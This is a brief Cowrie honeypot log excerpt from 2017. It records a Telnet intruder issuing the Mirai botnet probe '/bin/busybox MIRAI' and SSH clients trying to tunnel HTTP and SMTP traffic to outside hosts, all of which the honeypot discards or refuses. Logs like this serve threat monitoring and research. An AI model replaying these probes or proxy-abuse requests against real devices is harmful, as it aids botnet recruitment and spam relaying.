+2017-10-10T12:04:01+0000 [CowrieTelnetTransport,1686,59.125.253.158] Command found: sh 
+2017-10-10T12:04:01+0000 [CowrieTelnetTransport,1686,59.125.253.158] Received unhandled keyID: '\x00'
+2017-10-10T12:04:01+0000 [CowrieTelnetTransport,1686,59.125.253.158] CMD: /bin/busybox MIRAI
+2017-10-10T12:04:01+0000 [CowrieTelnetTransport,1686,59.125.253.158] Command found: /bin/busybox MIRAI
+2017-10-10T12:04:02+0000 [CowrieTelnetTransport,1686,59.125.253.158] Closing TTY Log: log/tty/20171010-120359-None-1686i.log after 3 seconds
+2017-10-10T12:04:02+0000 [CowrieTelnetTransport,1686,59.125.253.158] Connection lost after 6 seconds
+2017-10-10T12:04:16+0000 [SSHChannel cowrie-discarded-direct-tcpip (86) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] discarded direct-tcp forward request to mail.google.com:80 with data 'GET /mail/ HTTP/1.1\r\nHost: mail.google.com\r\nUser-Agent: Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.13337/724; U; en) Presto/2.2.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n'
+2017-10-10T12:04:16+0000 [SSHChannel cowrie-discarded-direct-tcpip (86) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1745,91.195.103.216] failed to connect: Connection refused
+2017-10-10T12:04:51+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] got channel 'direct-tcpip' request
+2017-10-10T12:04:51+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1845,91.195.103.197] direct-tcp connection request to 58.93.255.223:25 from ::1:34566
